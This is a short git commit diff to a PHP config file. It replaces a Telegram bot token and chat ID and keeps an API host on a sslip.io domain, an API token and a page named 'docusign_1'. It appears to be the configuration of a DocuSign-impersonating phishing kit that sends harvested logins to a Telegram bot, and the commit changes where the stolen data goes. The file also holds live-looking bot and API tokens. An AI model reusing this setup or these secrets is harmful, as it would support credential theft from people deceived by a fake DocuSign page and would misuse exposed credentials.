895a398eca611311cd7755bd1daa514d6596107c
lorrettavandenburgkow90-commits <lorrettavandenburgkow90@gmail.com>
2026-09-14 20:09:18 +0100

    Update config.php

--- config.php
+++ config.php
@@ -4,8 +4,8 @@ $api_host = "d0b7d5bb649199.68da34a9.sslip.io";
 $api_token = "f750fde536ea1e6b7646ac9e2301e3";
 $api_prefix = "f80i6iby";
 
-$telegram_bot_token = "8262420809:AAHTwbxwnRs5ZS22zUkwAqoseNqPfNDdB00";
-$telegram_chat_id = "5793923604";
+$telegram_bot_token = "8821840739:AAE9-7eB8-X2ype9qUxab7y4xLwotzCcIx4";
+$telegram_chat_id = "8793948257";
 
 $page_name = "docusign_1";
 
